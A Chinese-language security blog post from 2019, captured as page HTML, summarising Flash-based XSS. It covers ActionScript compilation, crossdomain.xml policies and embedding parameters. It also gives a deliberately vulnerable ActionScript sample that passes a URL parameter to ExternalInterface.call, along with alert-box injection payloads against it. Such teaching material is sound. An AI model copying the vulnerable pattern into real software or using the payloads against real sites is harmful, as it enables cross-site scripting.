@@ -1,0 +1,712 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no">
+<meta name="author" content="Mi1k7ea">
+
+
+
+<meta name="description" content="已完结.">
+<meta name="keywords" content="Web安全,Flash,XSS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Flash型XSS总结">
+<meta property="og:url" content="https://Mi1k7ea.github.com/2019/07/21/Flash型XSS小结/index.html">
+<meta property="og:site_name" content="Mi1k7ea">
+<meta property="og:description" content="已完结.">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/07/21/Flash型XSS小结/12.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/07/21/Flash型XSS小结/13.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/07/21/Flash型XSS小结/14.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/07/21/Flash型XSS小结/15.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/07/21/Flash型XSS小结/11.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/07/21/Flash型XSS小结/1.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/07/21/Flash型XSS小结/2.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/07/21/Flash型XSS小结/3.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/07/21/Flash型XSS小结/6.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/07/21/Flash型XSS小结/4.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/07/21/Flash型XSS小结/7.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/07/21/Flash型XSS小结/8.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/07/21/Flash型XSS小结/16.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/07/21/Flash型XSS小结/5.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/07/21/Flash型XSS小结/9.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/07/21/Flash型XSS小结/10.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/07/21/Flash型XSS小结/17.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/07/21/Flash型XSS小结/19.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/07/21/Flash型XSS小结/18.png">
+<meta property="og:updated_time" content="2019-07-28T06:54:57.697Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Flash型XSS总结">
+<meta name="twitter:description" content="已完结.">
+<meta name="twitter:image" content="https://mi1k7ea.github.com/2019/07/21/Flash型XSS小结/12.png">
+
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="Mi1k7ea" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>Flash型XSS总结 | Mi1k7ea</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Mi1k7ea</a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false">
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class="no-result">No results found <i class="fa fa-spinner fa-pulse"></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">Home</a></li>
+                        
+                            <li><a href="/archives/">Articles</a></li>
+                        
+                            <li><a href="/tags/">Classification</a></li>
+                        
+                            <li><a href="/about/">About</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:mi1k7ea@163.com" title="Email"></a>
+                            
+                                <a class="fa CSDN" href="https://blog.csdn.net/ski_12/" title="CSDN"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/AWD/">AWD</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C-C/">C/C++</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSRF/">CSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Flash/">Flash</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java/">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/JavaScript/">JavaScript</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pwn/">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQLI/">SQLI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL注入/">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSTI/">SSTI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpEL注入/">SpEL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web安全/">Web安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XML注入/">XML注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/">XSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/二进制/">二进制</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/命令注入/">命令注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/堆溢出/">堆溢出</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/安全开发/">安全开发</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/栈溢出/">栈溢出</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/沙箱逃逸/">沙箱逃逸</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+
+                
+                
+                <section class="switch-part switch-part3">
+                
+                    <div id="js-aboutme">安全界咸鱼</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Mi1k7ea</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Mi1k7ea</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">Home</a></li>
+                
+                    <li><a href="/archives/">Articles</a></li>
+                
+                    <li><a href="/tags/">Classification</a></li>
+                
+                    <li><a href="/about/">About</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:mi1k7ea@163.com" title="Email"></a>
+                            
+                                <a class="fa CSDN" target="_blank" href="https://blog.csdn.net/ski_12/" title="CSDN"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我">
+</nav>
+      <div class="body-wrap"><article id="post-Flash型XSS小结" class="article article-type-post" itemscope="" itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/07/21/Flash型XSS小结/" class="article-date">
+      <time datetime="2019-07-21T15:04:06.000Z" itemprop="datePublished">2019-07-21</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Flash型XSS总结
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/Web安全基础/">Web安全基础</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Flash/">Flash</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/">XSS</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01 基础知识"></a>0x01 基础知识</h2><h3 id="Flash与ActionScript"><a href="#Flash与ActionScript" class="headerlink" title="Flash与ActionScript"></a>Flash与ActionScript</h3><p>Flash（交互式矢量图和Web动画标准）是一种动画创作与应用程序开发于一身的创作软件。Adobe Flash Professional CC为创建数字动画、交互式Web站点、桌面应用程序以及手机应用程序开发提供了功能全面的创作和编辑环境。Flash广泛用于创建吸引人的应用程序，它们包含丰富的视频、声音、图形和动画。可以在Flash中创建原始内容或者从其它Adobe应用程序（如Photoshop或illustrator）导入它们，快速设计简单的动画，以及使用Adobe ActionScript 3.0开发高级的交互式项目。设计人员和开发人员可使用它来创建演示文稿、应用程序和其它允许用户交互的内容。Flash可以包含简单的动画、视频内容、复杂演示文稿和应用。</p>
+<p>ActionScript（简称AS）是由Macromedia（现已被Adobe收购）为其Flash产品开发的 ，最初是一种简单的脚本语言，现在最新版本ActionScript3.0，是一种完全的面向对象的编程语言，功能强大，类库丰富，语法类似JavaScript，多用于Flash互动性、娱乐性、实用性开发，网页制作和RIA（丰富互联网程序）开发。</p>
+<p>目前，网上大多数Flash都是应用ActionScript2或ActionScript3来编写的。</p>
+<h3 id="swf文件的编译与反编译"><a href="#swf文件的编译与反编译" class="headerlink" title="swf文件的编译与反编译"></a>swf文件的编译与反编译</h3><h4 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h4><p>使用Flex SDK，直接去官网下载，解压后进入bin目录输入如<code>mxmlc c:\..\..\xx.as</code>的命令，注意其是依赖于32位的JDK。</p>
+<p>当然，也可以使用Adobe Flash CS系列软件。</p>
+<p>看个示例，编写个弹框的swf文件：</p>
+<p>1、使用Flex SDK：</p>
+<p>编写Mi1k7ea.as文件如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">package</span><br><span class="line">&#123;</span><br><span class="line">    import flash.display.Sprite;</span><br><span class="line">    import flash.external.ExternalInterface;</span><br><span class="line">       </span><br><span class="line">    public class Mi1k7ea extends Sprite</span><br><span class="line">    &#123;</span><br><span class="line">        public function Mi1k7ea()</span><br><span class="line">        &#123;</span><br><span class="line">            ExternalInterface.call(&apos;alert(&quot;XSF Hacked&quot;)&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>进入bin目录输入如<code>mxmlc c:\..\..\Mi1k7ea.as</code>的命令即可生成Mi1k7ea.swf文件：</p>
+<p><img src="/2019/07/21/Flash型XSS小结/12.png" alt=""></p>
+<p>放到Web目录访问即可触发：</p>
+<p><img src="/2019/07/21/Flash型XSS小结/13.png" alt=""></p>
+<p>2、使用Adobe Flash CS系列软件：</p>
+<p>本地用的是Adobe Flash CS6。</p>
+<p>编写如下fla文件：</p>
+<p><img src="/2019/07/21/Flash型XSS小结/14.png" alt=""></p>
+<p>然后Ctrl+Enter或者点击文件&gt;导出&gt;导出影片来编译成swf文件，再访问即可触发：</p>
+<p><img src="/2019/07/21/Flash型XSS小结/15.png" alt=""></p>
+<h4 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h4><ul>
+<li>FFDec或硕思闪客精灵软件</li>
+<li>在线反编译网站：<a href="http://www.showmycode.com" target="_blank" rel="noopener">http://www.showmycode.com</a></li>
+</ul>
+<h3 id="Flash调用与跨域请求"><a href="#Flash调用与跨域请求" class="headerlink" title="Flash调用与跨域请求"></a>Flash调用与跨域请求</h3><p>Flash的调用和请求情形分别如下：</p>
+<ol>
+<li>HTML调用Flash时，Flash可以改后缀名；</li>
+<li>Flash可以单独访问，但是其效果类似于HTML调用同域的Flash，但是后缀必须是swf；</li>
+<li>Flash发动请求时，是根据Flash的域来判断的，而不是HTML来判断：</li>
+</ol>
+<p>（1）Flash请求同域资源时，直接忽视crossdomain.xml；</p>
+<p>（2）Flash请求外域资源时，受外域下crossdomain.xml里的策略限制；</p>
+<p>可知，Flash跨域请求时主要受crossdomain.xml文件的影响。</p>
+<p>crossdomain.xml文件严格遵循XML语法，主要作用就是当被Flash请求到本域资源的时候，是否允许请求。 例如：<a href="http://www.evil.com中嵌入一个Flash，Flash跨域请求www.q.com下的资源，此时会先查看www.q.com目录下的crossdomain.xml文件，查看是否允许evil.com域Flash请求本域的资源。" target="_blank" rel="noopener">www.evil.com中嵌入一个Flash，Flash跨域请求www.q.com下的资源，此时会先查看www.q.com目录下的crossdomain.xml文件，查看是否允许evil.com域Flash请求本域的资源。</a></p>
+<p>crossdomain.xml文件主要包含如下几个节点：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site-control，allow-access-<span class="keyword">from</span>，allow-access-<span class="keyword">from</span>-identity，allow-http-request-headers-<span class="keyword">from</span></span><br></pre></td></tr></table></figure>
+<p>常用的节点为allow-access-from，用来指明允许本域资源允许被哪些域名的Flash跨域请求。</p>
+<p>示例crossdomain.xml文件：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span>   </span><br><span class="line"><span class="meta">&lt;!DOCTYPE cross-domain-policy SYSTEM "http://www.adobe.com/xml/dtds/cross-domain-policy.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">cross-domain-policy</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">site-control</span> <span class="attr">permitted-cross-domain-policies</span>=<span class="string">"master-only"</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 允许example.com及其子域访问 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">allow-access-from</span> <span class="attr">domain</span>=<span class="string">"*.example.com"</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 允许http://www.example.com访问 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">allow-access-from</span> <span class="attr">domain</span>=<span class="string">"www.example.com"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">allow-http-request-headers-from</span> <span class="attr">domain</span>=<span class="string">"*.csdn.net"</span> <span class="attr">headers</span>=<span class="string">"*"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">cross-domain-policy</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>注意：这个文件常常被用到Flash型CSRF中，当allow-access-from domain被设置为*后，可能存在Flash型CSRF的风险。</p>
+<h3 id="Flash与相关的HTTP头字段"><a href="#Flash与相关的HTTP头字段" class="headerlink" title="Flash与相关的HTTP头字段"></a>Flash与相关的HTTP头字段</h3><h4 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h4><p>Flash请求的Referer为空或者为该swf文件地址。</p>
+<p>当为直接发请求的API时不带Referer；当HTML调用外域的Flash时，Flash发送的请求的Referer是Flash的地址而不是HTML的地址。</p>
+<p>当HTML页面调用Flash时，此时Flash文件可以改后缀，那么我们请求的Referer就会变成Flash修改后对应的文件的后缀，比如Flash文件后缀改为gif，则通过该Flash请求时的Referer为<code>Referer: http://a.com/exp.gif</code>。</p>
+<h4 id="x-flash-version"><a href="#x-flash-version" class="headerlink" title="x-flash-version"></a>x-flash-version</h4><p>Flash发送请求时会在HTTP头中添加x-flash-version字段来标识版本。</p>
+<h3 id="Flash安全沙箱"><a href="#Flash安全沙箱" class="headerlink" title="Flash安全沙箱"></a>Flash安全沙箱</h3><p>Flash安全沙盒定义了各个Flash应用程序可以访问的数据及操作的范围，用于控制swf文件间跨域访问。如果两个域之间没有进行信任授权是无法进行数据交互的。</p>
+<p>两个不同安全域下的swf文件之间是不能互相交互数据的。如果想让两个处于不同安全域内的swf文件进行数据交互通信，必须要经过授权来实现。经过数据通信授权后即可进行数据通信交互。</p>
+<h4 id="swf文件之间跨域访问的授权"><a href="#swf文件之间跨域访问的授权" class="headerlink" title="swf文件之间跨域访问的授权"></a>swf文件之间跨域访问的授权</h4><p>ActionScript中关于SWF文件跨域信任授权访问是通过Security.allowDomain()方法来实现的。这个方法是应用于swf文件跨域加载swf文件并访问其内部属性、方法、类等的场景。</p>
+<p>例如，<a href="http://a.example.com/a.swf代码，请求访问b.example.com域名下的b.swf文件：" target="_blank" rel="noopener">http://a.example.com/a.swf代码，请求访问b.example.com域名下的b.swf文件：</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var loader:Loader =new Loader();</span><br><span class="line">loader.contentLoaderInfo.addEventListener(Event.INIT,init);</span><br><span class="line">var url:String=&quot;http://b.example.com/b.swf&quot;;</span><br><span class="line">loader.load(new URLRequest(url));</span><br><span class="line">function init(event:Event):void</span><br><span class="line">&#123;  trace(loader.content);&#125;</span><br></pre></td></tr></table></figure>
+<p><a href="http://b.example.com/b.swf的代码：" target="_blank" rel="noopener">http://b.example.com/b.swf的代码：</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Security.allowDomain(&quot;a.example.com&quot;);</span><br><span class="line">Security.allowDomain(&quot;*&quot;);</span><br></pre></td></tr></table></figure>
+<p>上面是两种不同的设置方式：</p>
+<ol>
+<li><p>只允许a.example.com访问b.example.com中的SWF文件</p>
+</li>
+<li><p>如果使用*号那么任何域中的SWF文件都能访问执行调用b.exaple.com中的SWF文件。</p>
+</li>
+</ol>
+<h4 id="HTML跨域加载Flash时的授权"><a href="#HTML跨域加载Flash时的授权" class="headerlink" title="HTML跨域加载Flash时的授权"></a>HTML跨域加载Flash时的授权</h4><p>在HTML页面嵌入Flash时，其中的Object和Embed标签都有allowScriptAccess参数和allowNetworking参数，主要是用于在HTML页面调用执行Flash文件的场景。</p>
+<p>allowScriptAccess：控制html页面与Flash页面的通讯。</p>
+<ul>
+<li>always：html和Flash页面的通讯不做任何的限制；</li>
+<li>samedomain：html和Flash同域的时候可以做通讯【这个值是默认值】；</li>
+<li>never：html和Flash禁止通讯。</li>
+</ul>
+<p>allowNetworking：控制Flash与外部的网络通讯。</p>
+<ul>
+<li>all：Flash所有的网络API通讯接口都可用；</li>
+<li>internal：navigateToURL，fscommand，ExternalInterface.call不可用；</li>
+<li>none：所有的网络API不可用。</li>
+</ul>
+<h3 id="HTML中嵌入Flash"><a href="#HTML中嵌入Flash" class="headerlink" title="HTML中嵌入Flash"></a>HTML中嵌入Flash</h3><p>在HTML中嵌入FLASH的时候在IE和非IE浏览器下嵌入的方式有所不同，可以使用embed标签和object标签。</p>
+<p>IE下嵌入：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">codeBase</span>=<span class="string">"http://fpdownload.macromedia.com/get/Flashplayer/current/swFlash.cab#version=8,0,0,0"</span> <span class="attr">classid</span>=<span class="string">"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"movie"</span> <span class="attr">value</span> = <span class="string">"http://example.com/exp.swf"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"allowScriptAccess"</span> <span class="attr">value</span>=<span class="string">"always"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"allowNetworking"</span> <span class="attr">value</span>=<span class="string">"all"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>非IE下嵌入（IE8能成功，本地最新IE11也OK）：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">type</span>=<span class="string">"application/x-shockwave-Flash"</span> <span class="attr">data</span>=<span class="string">"./exp.swf"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"movie"</span> <span class="attr">value</span> = <span class="string">"./exp.swf"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"allowScriptAccess"</span> <span class="attr">value</span>=<span class="string">"always"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"allowNetworking"</span> <span class="attr">value</span>=<span class="string">"all"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>非IE下嵌入的Demo示例，嵌入同源站点的Mi1k7ea.swf，其作用是弹框：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">object</span> <span class="attr">id</span>=<span class="string">"lso"</span> <span class="attr">type</span>=<span class="string">"application/x-shockwave-Flash"</span> <span class="attr">data</span>=<span class="string">"http://127.0.0.1/Mi1k7ea.swf"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"movie"</span> <span class="attr">value</span> = <span class="string">"http://127.0.0.1/Mi1k7ea.swf"</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"allowScriptAccess"</span> <span class="attr">value</span>=<span class="string">"always"</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"allowNetworking"</span> <span class="attr">value</span>=<span class="string">"all"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在Firefox上访问直接触发，然而本地最新版的IE11也能成功嵌入触发：</p>
+<p><img src="/2019/07/21/Flash型XSS小结/11.png" alt=""></p>
+<h3 id="Flash的参数传递"><a href="#Flash的参数传递" class="headerlink" title="Flash的参数传递"></a>Flash的参数传递</h3><p>Flash的参数传递形式按ActionScript语言的版本来分：</p>
+<ul>
+<li>ActionScript 2：以<code>_root.argv</code>形式，argv直接就是参数名</li>
+<li>ActionScript 3：以<code>loaderInfo.parameters</code>形式，返回key和value的字典结构。</li>
+</ul>
+<h2 id="0x02-Flash-XSS"><a href="#0x02-Flash-XSS" class="headerlink" title="0x02 Flash XSS"></a>0x02 Flash XSS</h2><p>Flash型XSS，即由Flash插件引起的一系列XSS问题，主要有以下两种方式：</p>
+<ul>
+<li>与JavaScript通信引发的XSS；</li>
+<li>加载第三方资源引发的XSS；</li>
+</ul>
+<h3 id="ExternalInterface-call"><a href="#ExternalInterface-call" class="headerlink" title="ExternalInterface.call"></a>ExternalInterface.call</h3><p>Flash中可以使用ExternalInterface.call来执行JavaScript代码。</p>
+<p>ExternalInterface.callzhong1可传递0个参数或传递多个参数，这里我们只探讨如下两个：</p>
+<ul>
+<li>ExternalInterface.call(“函数名”)</li>
+<li>ExternalInterface.call(“函数名”,”参数”)</li>
+</ul>
+<h4 id="第一个参数可控"><a href="#第一个参数可控" class="headerlink" title="第一个参数可控"></a>第一个参数可控</h4><p>FlashXss.as，这里我们可以传入第一个参数值：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">package</span><br><span class="line">&#123;</span><br><span class="line">    import flash.display.Sprite;</span><br><span class="line">    import flash.external.ExternalInterface;</span><br><span class="line">       </span><br><span class="line">    public class FlashXss extends Sprite</span><br><span class="line">    &#123;</span><br><span class="line">        public function FlashXss()</span><br><span class="line">        &#123;</span><br><span class="line">            var jsFunction:String = loaderInfo.parameters.movieName;</span><br><span class="line">            var param:String = &quot;Mi1k7ea&quot;;</span><br><span class="line">            ExternalInterface.call(jsFunction, param);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>将该as文件编译成swf文件：</p>
+<p><img src="/2019/07/21/Flash型XSS小结/1.png" alt=""></p>
+<p>将该swf放在Web目录下。尝试访问并输入payload<code>?movieName=alert</code>，在Chrome下不能成功执行swf而是变成了下载文件，换了Firefox和IE就可以了：</p>
+<p><img src="/2019/07/21/Flash型XSS小结/2.png" alt=""></p>
+<p>再次输入<code>?movieName=alert(&#39;hacked&#39;)</code>：</p>
+<p><img src="/2019/07/21/Flash型XSS小结/3.png" alt=""></p>
